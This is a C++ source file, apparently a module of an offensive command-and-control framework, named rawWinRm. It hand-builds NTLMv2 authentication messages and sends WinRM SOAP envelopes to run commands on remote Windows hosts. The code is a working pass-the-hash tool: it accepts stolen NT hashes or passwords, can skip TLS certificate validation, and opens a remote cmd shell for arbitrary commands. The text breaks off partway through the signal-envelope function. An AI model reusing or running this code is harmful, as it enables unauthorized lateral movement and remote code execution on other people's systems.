#include "RawWinRm.hpp"

#include "ModuleCmd/Common.hpp"

#include <algorithm>
#include <array>
#include <chrono>
#include <cctype>
#include <cstdlib>
#include <cstring>
#include <iomanip>
#include <random>
#include <sstream>
#include <stdexcept>
#include <vector>

#include <base64.h>

#ifdef _WIN32
#include <Windows.h>
#include <Winhttp.h>
#include <iphlpapi.h>
#include <wincrypt.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/md4.h>
#include <openssl/md5.h>

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "Iphlpapi.lib")
#endif

using namespace std;

constexpr std::string_view moduleNameRawWinRm = "rawWinRm";
constexpr unsigned long long moduleHashRawWinRm = djb2(moduleNameRawWinRm);

#ifdef _WIN32
extern "C" __declspec(dllexport) RawWinRm* RawWinRmConstructor()
{
    return new RawWinRm();
}
#else
extern "C" __attribute__((visibility("default"))) RawWinRm* RawWinRmConstructor()
{
    return new RawWinRm();
}
#endif

RawWinRm::RawWinRm()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameRawWinRm), moduleHashRawWinRm)
#else
    : ModuleCmd("", moduleHashRawWinRm)
#endif
{
}

RawWinRm::~RawWinRm() = default;

namespace
{
    struct ModuleOptions
    {
        std::string url;
        std::string username;
        std::string secret;
        bool secretIsHash = true;
        std::string command;
        bool disableTlsValidation = false;
        std::string workstation;
    };

    std::string generateUsage()
    {
        std::ostringstream oss;
        oss << "RawWinRm Module:\n";
        oss << "Execute commands over WinRM using a handcrafted NTLM authentication flow.\n\n";
        oss << "Usage:\n";
        oss << "  rawWinRm <url> <user> --hash <NTLM hash> <command ...>\n";
        oss << "  rawWinRm <url> <user> --password <password> <command ...>\n";
        oss << "Options:\n";
        oss << "  --hash       Provide the NTLM hash (LM:NT or NT only).\n";
        oss << "  --password   Provide a clear-text password; the NT hash is derived locally.\n";
        oss << "  --workstation <name>  Override workstation value used in NTLM messages.\n";
        oss << "  --skip-cert-validation  Ignore TLS certificate validation errors.\n";
        return oss.str();
    }

    bool toBool(const std::string& value)
    {
        return value == "1" || value == "true" || value == "True" || value == "TRUE";
    }

    ModuleOptions parsePackedOptions(const std::string& packed)
    {
        ModuleOptions opts;
        std::vector<std::string> values;
        splitList(packed, "\0", values);
        if(values.size() < 5)
        {
            throw std::runtime_error("Invalid packed message");
        }
        opts.url = values[0];
        opts.username = values[1];
        opts.secret = values[2];
        opts.secretIsHash = toBool(values[3]);
        opts.disableTlsValidation = toBool(values[4]);
        if(values.size() > 5)
        {
            opts.workstation = values[5];
        }
        return opts;
    }

    std::string packOptions(const ModuleOptions& opts)
    {
        std::string packed = opts.url;
        packed.push_back('\0');
        packed += opts.username;
        packed.push_back('\0');
        packed += opts.secret;
        packed.push_back('\0');
        packed += opts.secretIsHash ? "1" : "0";
        packed.push_back('\0');
        packed += opts.disableTlsValidation ? "1" : "0";
        packed.push_back('\0');
        packed += opts.workstation;
        return packed;
    }

#ifdef _WIN32

    std::wstring toWide(const std::string& input)
    {
        if(input.empty())
        {
            return std::wstring();
        }
        int size = MultiByteToWideChar(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), nullptr, 0);
        std::wstring wide(size, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), wide.data(), size);
        return wide;
    }

    std::string toNarrow(const std::wstring& input)
    {
        if(input.empty())
        {
            return std::string();
        }
        int size = WideCharToMultiByte(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), nullptr, 0, nullptr, nullptr);
        std::string output(size, '\0');
        WideCharToMultiByte(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), output.data(), size, nullptr, nullptr);
        return output;
    }

    std::string lowerAscii(const std::string& value)
    {
        std::string tmp = value;
        std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](unsigned char ch) { return static_cast<char>(std::tolower(ch)); });
        return tmp;
    }

    std::string upperAscii(const std::string& value)
    {
        std::string tmp = value;
        std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](unsigned char ch) { return static_cast<char>(std::toupper(ch)); });
        return tmp;
    }

    std::vector<uint8_t> utf16leFromUtf8(const std::string& text)
    {
        std::wstring wide = toWide(text);
        std::vector<uint8_t> buffer(wide.size() * sizeof(wchar_t));
        std::memcpy(buffer.data(), wide.data(), buffer.size());
        return buffer;
    }

    struct UrlComponents
    {
        std::wstring host;
        std::wstring path;
        INTERNET_PORT port = 5985;
        bool useTls = false;
    };

    UrlComponents parseUrl(const std::string& url)
    {
        URL_COMPONENTS components{};
        components.dwStructSize = sizeof(components);
        components.dwSchemeLength = -1;
        components.dwHostNameLength = -1;
        components.dwUrlPathLength = -1;
        components.dwExtraInfoLength = -1;

        std::wstring wideUrl = toWide(url);
        if(!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &components))
        {
            throw std::runtime_error("Unable to parse target url");
        }

        UrlComponents result;
        if(components.lpszHostName && components.dwHostNameLength)
        {
            result.host.assign(components.lpszHostName, components.dwHostNameLength);
        }
        if(components.lpszUrlPath && components.dwUrlPathLength)
        {
            result.path.assign(components.lpszUrlPath, components.dwUrlPathLength);
        }
        else
        {
            result.path = L"/wsman";
        }
        if(result.path.empty())
        {
            result.path = L"/wsman";
        }

        result.port = components.nPort ? components.nPort : (components.nScheme == INTERNET_SCHEME_HTTPS ? 5986 : 5985);
        result.useTls = components.nScheme == INTERNET_SCHEME_HTTPS;
        return result;
    }

    std::string randomUuid()
    {
        std::array<uint8_t, 16> bytes{};
        HCRYPTPROV prov;
        if(CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
        {
            CryptGenRandom(prov, static_cast<DWORD>(bytes.size()), bytes.data());
            CryptReleaseContext(prov, 0);
        }
        else
        {
            std::random_device rd;
            for(auto& b : bytes)
            {
                b = static_cast<uint8_t>(rd() & 0xFF);
            }
        }

        bytes[6] = (bytes[6] & 0x0F) | 0x40;
        bytes[8] = (bytes[8] & 0x3F) | 0x80;

        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for(size_t i = 0; i < bytes.size(); ++i)
        {
            oss << std::setw(2) << static_cast<int>(bytes[i]);
            if(i == 3 || i == 5 || i == 7 || i == 9)
            {
                oss << '-';
            }
        }
        return oss.str();
    }

    class ScopedHandle
    {
    public:
        ScopedHandle() = default;
        explicit ScopedHandle(HINTERNET handle) : handle_(handle) {}
        ~ScopedHandle()
        {
            reset();
        }

        ScopedHandle(const ScopedHandle&) = delete;
        ScopedHandle& operator=(const ScopedHandle&) = delete;

        ScopedHandle(ScopedHandle&& other) noexcept : handle_(other.handle_)
        {
            other.handle_ = nullptr;
        }

        ScopedHandle& operator=(ScopedHandle&& other) noexcept
        {
            if(this != &other)
            {
                reset();
                handle_ = other.handle_;
                other.handle_ = nullptr;
            }
            return *this;
        }

        void reset(HINTERNET handle = nullptr)
        {
            if(handle_)
            {
                WinHttpCloseHandle(handle_);
            }
            handle_ = handle;
        }

        HINTERNET get() const
        {
            return handle_;
        }

        explicit operator bool() const
        {
            return handle_ != nullptr;
        }

    private:
        HINTERNET handle_ = nullptr;
    };

    std::string readResponseBody(HINTERNET request)
    {
        std::string body;
        DWORD available = 0;
        while(WinHttpQueryDataAvailable(request, &available) && available)
        {
            std::string chunk(available, '\0');
            DWORD read = 0;
            if(!WinHttpReadData(request, chunk.data(), available, &read))
            {
                throw std::runtime_error("Failed to read response body");
            }
            chunk.resize(read);
            body += chunk;
        }
        return body;
    }

    std::string queryHeaderString(HINTERNET request, DWORD infoLevel)
    {
        DWORD size = 0;
        WinHttpQueryHeaders(request, infoLevel, WINHTTP_HEADER_NAME_BY_INDEX, nullptr, &size, WINHTTP_NO_HEADER_INDEX);
        if(GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            return {};
        }
        std::wstring buffer(size / sizeof(wchar_t), L'\0');
        if(!WinHttpQueryHeaders(request, infoLevel, WINHTTP_HEADER_NAME_BY_INDEX, buffer.data(), &size, WINHTTP_NO_HEADER_INDEX))
        {
            return {};
        }
        return toNarrow(buffer);
    }

    std::string extractNtlmChallenge(const std::string& header)
    {
        std::string lowerHeader = lowerAscii(header);
        size_t pos = lowerHeader.find("ntlm ");
        if(pos == std::string::npos)
        {
            return {};
        }
        pos += 5;
        size_t end = header.find_first_of("\r\n", pos);
        if(end == std::string::npos)
        {
            end = header.size();
        }
        return header.substr(pos, end - pos);
    }

    std::vector<uint8_t> decodeBase64(const std::string& input)
    {
        std::string decoded = base64_decode(input);
        return std::vector<uint8_t>(decoded.begin(), decoded.end());
    }

    std::string encodeBase64(const std::vector<uint8_t>& input)
    {
        std::string tmp(reinterpret_cast<const char*>(input.data()), input.size());
        return base64_encode(tmp);
    }

    uint32_t readUint32(const uint8_t* data)
    {
        return data[0] | (data[1] << 8) | (data[2] << 16) | (data[3] << 24);
    }

    uint16_t readUint16(const uint8_t* data)
    {
        return data[0] | (data[1] << 8);
    }

    std::vector<uint8_t> hmacMd5(const std::vector<uint8_t>& key, const std::vector<uint8_t>& message)
    {
        unsigned int len = 0;
        std::vector<uint8_t> result(EVP_MAX_MD_SIZE);
        unsigned char* out = HMAC(EVP_md5(), key.data(), static_cast<int>(key.size()), message.data(), message.size(), result.data(), &len);
        if(out == nullptr)
        {
            throw std::runtime_error("HMAC-MD5 failed");
        }
        result.resize(len);
        return result;
    }

    std::vector<uint8_t> md4Hash(const std::vector<uint8_t>& input)
    {
        std::vector<uint8_t> hash(MD4_DIGEST_LENGTH);
        MD4(input.data(), input.size(), hash.data());
        return hash;
    }

    std::vector<uint8_t> parseNtHash(const std::string& value)
    {
        auto hexToBytes = [](const std::string& hex) {
            std::vector<uint8_t> data;
            if(hex.size() % 2 != 0)
            {
                throw std::runtime_error("Invalid hash length");
            }
            data.reserve(hex.size() / 2);
            for(size_t i = 0; i < hex.size(); i += 2)
            {
                uint8_t byte = static_cast<uint8_t>(std::stoi(hex.substr(i, 2), nullptr, 16));
                data.push_back(byte);
            }
            return data;
        };

        std::string hash = value;
        auto pos = hash.find(':');
        if(pos != std::string::npos)
        {
            hash = hash.substr(pos + 1);
        }
        if(hash.size() != 32)
        {
            throw std::runtime_error("Expected a 32-character NT hash");
        }
        std::transform(hash.begin(), hash.end(), hash.begin(), [](unsigned char ch) { return static_cast<char>(std::tolower(ch)); });
        return hexToBytes(hash);
    }

    std::vector<uint8_t> computeNtHashFromPassword(const std::string& password)
    {
        std::vector<uint8_t> unicode = utf16leFromUtf8(password);
        return md4Hash(unicode);
    }

    struct Type2Info
    {
        std::array<uint8_t, 8> challenge{};
        std::vector<uint8_t> targetInfo;
        uint32_t flags = 0;
    };

    Type2Info parseType2(const std::string& type2)
    {
        auto bytes = decodeBase64(type2);
        if(bytes.size() < 48)
        {
            throw std::runtime_error("Type 2 message too short");
        }
        Type2Info info;
        info.flags = readUint32(bytes.data() + 20);
        std::memcpy(info.challenge.data(), bytes.data() + 24, 8);
        uint16_t targetInfoLen = readUint16(bytes.data() + 40);
        uint32_t targetInfoOffset = readUint32(bytes.data() + 44);
        if(targetInfoOffset + targetInfoLen <= bytes.size())
        {
            info.targetInfo.assign(bytes.begin() + targetInfoOffset, bytes.begin() + targetInfoOffset + targetInfoLen);
        }
        return info;
    }

    struct NtlmV2Responses
    {
        std::vector<uint8_t> lmResponse;
        std::vector<uint8_t> ntResponse;
    };

    NtlmV2Responses buildNtlmV2Response(const std::vector<uint8_t>& ntHash,
                                        const std::string& username,
                                        const std::string& domain,
                                        const Type2Info& type2)
    {
        SYSTEMTIME st;
        GetSystemTime(&st);
        FILETIME ft;
        SystemTimeToFileTime(&st, &ft);
        ULARGE_INTEGER time{};
        time.LowPart = ft.dwLowDateTime;
        time.HighPart = ft.dwHighDateTime;
        constexpr ULONGLONG epochDiff = 116444736000000000ULL;
        ULONGLONG timestamp = time.QuadPart + epochDiff;

        std::array<uint8_t, 8> clientChallenge{};
        HCRYPTPROV prov;
        if(CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
        {
            CryptGenRandom(prov, static_cast<DWORD>(clientChallenge.size()), clientChallenge.data());
            CryptReleaseContext(prov, 0);
        }
        else
        {
            std::random_device rd;
            for(auto& b : clientChallenge)
            {
                b = static_cast<uint8_t>(rd() & 0xFF);
            }
        }

        std::string identity = upperAscii(username) + domain;
        std::vector<uint8_t> identityBytes = utf16leFromUtf8(identity);
        std::vector<uint8_t> ntlmv2Hash = hmacMd5(ntHash, identityBytes);

        std::vector<uint8_t> blob;
        blob.reserve(32 + type2.targetInfo.size());
        auto append32 = [&blob](uint32_t value) {
            blob.push_back(static_cast<uint8_t>(value & 0xFF));
            blob.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
            blob.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
            blob.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
        };

        blob.push_back(0x01);
        blob.push_back(0x01);
        blob.push_back(0x00);
        blob.push_back(0x00);
        append32(0);

        ULONGLONG ts = timestamp;
        for(int i = 0; i < 8; ++i)
        {
            blob.push_back(static_cast<uint8_t>((ts >> (i * 8)) & 0xFF));
        }

        blob.insert(blob.end(), clientChallenge.begin(), clientChallenge.end());
        append32(0);
        blob.insert(blob.end(), type2.targetInfo.begin(), type2.targetInfo.end());
        append32(0);

        std::vector<uint8_t> hmacInput;
        hmacInput.reserve(8 + blob.size());
        hmacInput.insert(hmacInput.end(), type2.challenge.begin(), type2.challenge.end());
        hmacInput.insert(hmacInput.end(), blob.begin(), blob.end());

        std::vector<uint8_t> ntProof = hmacMd5(ntlmv2Hash, hmacInput);

        std::vector<uint8_t> ntResponse(ntProof);
        ntResponse.insert(ntResponse.end(), blob.begin(), blob.end());

        std::vector<uint8_t> lmInput;
        lmInput.reserve(16);
        lmInput.insert(lmInput.end(), type2.challenge.begin(), type2.challenge.end());
        lmInput.insert(lmInput.end(), clientChallenge.begin(), clientChallenge.end());
        std::vector<uint8_t> lmHash = hmacMd5(ntlmv2Hash, lmInput);
        std::vector<uint8_t> lmResponse(lmHash.begin(), lmHash.begin() + 16);
        lmResponse.insert(lmResponse.end(), clientChallenge.begin(), clientChallenge.end());

        return {lmResponse, ntResponse};
    }

    std::vector<uint8_t> buildType1Message(const std::string& workstation, const std::string& domain)
    {
        const uint32_t flags = 0xb207;
        std::vector<uint8_t> workstationBytes = utf16leFromUtf8(workstation);
        std::vector<uint8_t> domainBytes = utf16leFromUtf8(domain);

        const size_t headerSize = 32;
        size_t payloadSize = workstationBytes.size() + domainBytes.size();
        std::vector<uint8_t> message(headerSize + payloadSize, 0);

        std::memcpy(message.data(), "NTLMSSP\0", 8);
        message[8] = 1;

        auto writeSecBuf = [&](size_t offset, uint16_t length, uint32_t bufferOffset) {
            message[offset] = static_cast<uint8_t>(length & 0xFF);
            message[offset + 1] = static_cast<uint8_t>((length >> 8) & 0xFF);
            message[offset + 2] = message[offset];
            message[offset + 3] = message[offset + 1];
            message[offset + 4] = static_cast<uint8_t>(bufferOffset & 0xFF);
            message[offset + 5] = static_cast<uint8_t>((bufferOffset >> 8) & 0xFF);
            message[offset + 6] = static_cast<uint8_t>((bufferOffset >> 16) & 0xFF);
            message[offset + 7] = static_cast<uint8_t>((bufferOffset >> 24) & 0xFF);
        };

        size_t payloadOffset = headerSize;
        writeSecBuf(16, static_cast<uint16_t>(domainBytes.size()), static_cast<uint32_t>(payloadOffset));
        std::memcpy(message.data() + payloadOffset, domainBytes.data(), domainBytes.size());
        payloadOffset += domainBytes.size();

        writeSecBuf(24, static_cast<uint16_t>(workstationBytes.size()), static_cast<uint32_t>(payloadOffset));
        std::memcpy(message.data() + payloadOffset, workstationBytes.data(), workstationBytes.size());

        message[12] = static_cast<uint8_t>(flags & 0xFF);
        message[13] = static_cast<uint8_t>((flags >> 8) & 0xFF);
        message[14] = static_cast<uint8_t>((flags >> 16) & 0xFF);
        message[15] = static_cast<uint8_t>((flags >> 24) & 0xFF);

        return message;
    }

    std::vector<uint8_t> buildType3Message(const std::string& username,
                                           const std::string& domain,
                                           const std::string& workstation,
                                           const Type2Info& type2,
                                           const std::vector<uint8_t>& ntHash)
    {
        std::vector<uint8_t> usernameBytes = utf16leFromUtf8(username);
        std::vector<uint8_t> domainBytes = utf16leFromUtf8(domain);
        std::vector<uint8_t> workstationBytes = utf16leFromUtf8(workstation);

        NtlmV2Responses responses = buildNtlmV2Response(ntHash, username, domain, type2);
        std::vector<uint8_t> ntResponse = std::move(responses.ntResponse);
        std::vector<uint8_t> lmResponse = std::move(responses.lmResponse);

        const uint32_t flags = type2.flags | 0x02000000;
        const size_t headerSize = 72;
        size_t payloadSize = domainBytes.size() + usernameBytes.size() + workstationBytes.size() + lmResponse.size() + ntResponse.size();

        std::vector<uint8_t> message(headerSize + payloadSize, 0);
        std::memcpy(message.data(), "NTLMSSP\0", 8);
        message[8] = 3;

        auto writeSecBuf = [&](size_t offset, const std::vector<uint8_t>& data, size_t& cursor)
        {
            uint16_t length = static_cast<uint16_t>(data.size());
            message[offset] = static_cast<uint8_t>(length & 0xFF);
            message[offset + 1] = static_cast<uint8_t>((length >> 8) & 0xFF);
            message[offset + 2] = message[offset];
            message[offset + 3] = message[offset + 1];
            uint32_t pos = static_cast<uint32_t>(cursor);
            message[offset + 4] = static_cast<uint8_t>(pos & 0xFF);
            message[offset + 5] = static_cast<uint8_t>((pos >> 8) & 0xFF);
            message[offset + 6] = static_cast<uint8_t>((pos >> 16) & 0xFF);
            message[offset + 7] = static_cast<uint8_t>((pos >> 24) & 0xFF);
            if(!data.empty())
            {
                std::memcpy(message.data() + cursor, data.data(), data.size());
                cursor += data.size();
            }
        };

        size_t cursor = headerSize;
        writeSecBuf(12, lmResponse, cursor);
        writeSecBuf(20, ntResponse, cursor);
        writeSecBuf(28, domainBytes, cursor);
        writeSecBuf(36, usernameBytes, cursor);
        writeSecBuf(44, workstationBytes, cursor);

        writeSecBuf(52, {}, cursor);

        message[60] = static_cast<uint8_t>(flags & 0xFF);
        message[61] = static_cast<uint8_t>((flags >> 8) & 0xFF);
        message[62] = static_cast<uint8_t>((flags >> 16) & 0xFF);
        message[63] = static_cast<uint8_t>((flags >> 24) & 0xFF);

        return message;
    }

    class RawWinRmHttp
    {
    public:
        RawWinRmHttp(const UrlComponents& url, bool ignoreCert)
        {
            session_.reset(WinHttpOpen(L"RawWinRm/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
            if(!session_)
            {
                throw std::runtime_error("WinHttpOpen failed");
            }

            connect_.reset(WinHttpConnect(session_.get(), url.host.c_str(), url.port, 0));
            if(!connect_)
            {
                throw std::runtime_error("WinHttpConnect failed");
            }

            path_ = url.path;
            useTls_ = url.useTls;
            ignoreCert_ = ignoreCert;
        }

        std::string post(const std::string& body, const std::string& soapAction, const std::string& username, const std::string& domain, const std::vector<uint8_t>& ntHash, const std::string& workstation)
        {
            std::vector<uint8_t> type1 = buildType1Message(workstation, domain);
            std::string type1Header = encodeBase64(type1);

            ScopedHandle request;
            request.reset(WinHttpOpenRequest(connect_.get(), L"POST", path_.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             useTls_ ? WINHTTP_FLAG_SECURE : 0));
            if(!request)
            {
                throw std::runtime_error("WinHttpOpenRequest failed");
            }

            if(useTls_ && ignoreCert_)
            {
                DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
                WinHttpSetOption(request.get(), WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
            }

            std::ostringstream headers;
            headers << "Authorization: NTLM " << type1Header << "\r\n";
            headers << "Connection: Keep-Alive\r\n";
            headers << "Content-Length: 0\r\n";

            std::wstring wideHeaders = toWide(headers.str());
            if(!WinHttpSendRequest(request.get(), wideHeaders.c_str(), static_cast<DWORD>(-1L), WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
            {
                throw std::runtime_error("Failed to send Type1 message");
            }

            if(!WinHttpReceiveResponse(request.get(), nullptr))
            {
                throw std::runtime_error("Failed to receive Type2 response");
            }

            std::string authenticateHeader = queryHeaderString(request.get(), WINHTTP_QUERY_WWW_AUTHENTICATE);
            std::string type2 = extractNtlmChallenge(authenticateHeader);
            if(type2.empty())
            {
                throw std::runtime_error("Server did not provide NTLM challenge");
            }

            Type2Info type2Info = parseType2(type2);
            std::vector<uint8_t> type3 = buildType3Message(username, domain, workstation, type2Info, ntHash);
            std::string type3Header = encodeBase64(type3);

            request.reset(WinHttpOpenRequest(connect_.get(), L"POST", path_.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             useTls_ ? WINHTTP_FLAG_SECURE : 0));
            if(!request)
            {
                throw std::runtime_error("WinHttpOpenRequest failed (type3)");
            }

            if(useTls_ && ignoreCert_)
            {
                DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
                WinHttpSetOption(request.get(), WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
            }

            std::ostringstream requestHeaders;
            requestHeaders << "Authorization: NTLM " << type3Header << "\r\n";
            requestHeaders << "Content-Type: application/soap+xml;charset=UTF-8\r\n";
            requestHeaders << "Connection: Keep-Alive\r\n";
            if(!soapAction.empty())
            {
                requestHeaders << "SOAPAction: \"" << soapAction << "\"\r\n";
            }
            requestHeaders << "Content-Length: " << body.size() << "\r\n";

            std::wstring wideRequestHeaders = toWide(requestHeaders.str());
            if(!WinHttpSendRequest(request.get(), wideRequestHeaders.c_str(), static_cast<DWORD>(-1L), (LPVOID)body.data(), static_cast<DWORD>(body.size()), static_cast<DWORD>(body.size()), 0))
            {
                throw std::runtime_error("Failed to send NTLM authenticated request");
            }

            if(!WinHttpReceiveResponse(request.get(), nullptr))
            {
                throw std::runtime_error("Failed to receive WinRM response");
            }

            DWORD status = 0;
            DWORD size = sizeof(status);
            if(WinHttpQueryHeaders(request.get(), WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, &size, WINHTTP_NO_HEADER_INDEX))
            {
                if(status >= 400)
                {
                    std::ostringstream oss;
                    oss << "HTTP error: " << status;
                    throw std::runtime_error(oss.str());
                }
            }

            return readResponseBody(request.get());
        }

    private:
        ScopedHandle session_;
        ScopedHandle connect_;
        std::wstring path_;
        bool useTls_ = false;
        bool ignoreCert_ = false;
    };

    struct ShellContext
    {
        std::string shellId;
        std::string commandId;
        std::string output;
        std::string error;
        int exitCode = -1;
    };

    std::string buildCreateShellEnvelope(const std::string& url)
    {
        std::string messageId = randomUuid();
        std::ostringstream oss;
        oss << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
        oss << "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">";
        oss << "<s:Header>";
        oss << "<a:To>" << url << "</a:To>";
        oss << "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>";
        oss << "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>";
        oss << "<a:Action s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>";
        oss << "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>";
        oss << "<a:MessageID>urn:uuid:" << messageId << "</a:MessageID>";
        oss << "<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>";
        oss << "<w:OperationTimeout>PT60.000S</w:OperationTimeout>";
        oss << "<w:OptionSet>";
        oss << "<w:Option Name=\"WINRS_NOPROFILE\">FALSE</w:Option>";
        oss << "<w:Option Name=\"WINRS_CODEPAGE\">65001</w:Option>";
        oss << "</w:OptionSet>";
        oss << "</s:Header>";
        oss << "<s:Body>";
        oss << "<rsp:Shell>";
        oss << "<rsp:InputStreams>stdin</rsp:InputStreams>";
        oss << "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>";
        oss << "</rsp:Shell>";
        oss << "</s:Body>";
        oss << "</s:Envelope>";
        return oss.str();
    }

    std::string buildCommandEnvelope(const std::string& url, const std::string& shellId, const std::string& command)
    {
        std::string messageId = randomUuid();
        std::string commandXml;
        commandXml.reserve(command.size());
        for(char c : command)
        {
            switch(c)
            {
            case '&': commandXml += "&amp;"; break;
            case '<': commandXml += "&lt;"; break;
            case '>': commandXml += "&gt;"; break;
            case '\"': commandXml += "&quot;"; break;
            case '\'': commandXml += "&apos;"; break;
            default: commandXml += c; break;
            }
        }

        std::ostringstream oss;
        oss << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
        oss << "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">";
        oss << "<s:Header>";
        oss << "<a:To>" << url << "</a:To>";
        oss << "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>";
        oss << "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>";
        oss << "<a:Action s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>";
        oss << "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>";
        oss << "<a:MessageID>urn:uuid:" << messageId << "</a:MessageID>";
        oss << "<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>";
        oss << "<w:OperationTimeout>PT60.000S</w:OperationTimeout>";
        oss << "<w:SelectorSet><w:Selector Name=\"ShellId\">" << shellId << "</w:Selector></w:SelectorSet>";
        oss << "</s:Header>";
        oss << "<s:Body>";
        oss << "<rsp:CommandLine>";
        oss << "<rsp:Command>" << commandXml << "</rsp:Command>";
        oss << "</rsp:CommandLine>";
        oss << "</s:Body>";
        oss << "</s:Envelope>";
        return oss.str();
    }

    std::string buildReceiveEnvelope(const std::string& url, const std::string& shellId, const std::string& commandId)
    {
        std::string messageId = randomUuid();
        std::ostringstream oss;
        oss << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
        oss << "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">";
        oss << "<s:Header>";
        oss << "<a:To>" << url << "</a:To>";
        oss << "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>";
        oss << "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>";
        oss << "<a:Action s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>";
        oss << "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>";
        oss << "<a:MessageID>urn:uuid:" << messageId << "</a:MessageID>";
        oss << "<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>";
        oss << "<w:OperationTimeout>PT60.000S</w:OperationTimeout>";
        oss << "<w:SelectorSet><w:Selector Name=\"ShellId\">" << shellId << "</w:Selector></w:SelectorSet>";
        oss << "</s:Header>";
        oss << "<s:Body>";
        oss << "<rsp:Receive>";
        oss << "<rsp:DesiredStream CommandId=\"" << commandId << "\">stdout stderr</rsp:DesiredStream>";
        oss << "</rsp:Receive>";
        oss << "</s:Body>";
        oss << "</s:Envelope>";
        return oss.str();
    }

    std::string buildSignalEnvelope(const std::string& url, const std::string& shellId, const std::string& commandId)
    {
        std::string messageId = randomUuid();
        std::ostringstream oss;
        oss << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
        oss << "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">";
        oss << "<s:Header>";
        oss << "<a:To>" << url << "</a:To>";
        oss << "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>";
        oss << "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>";
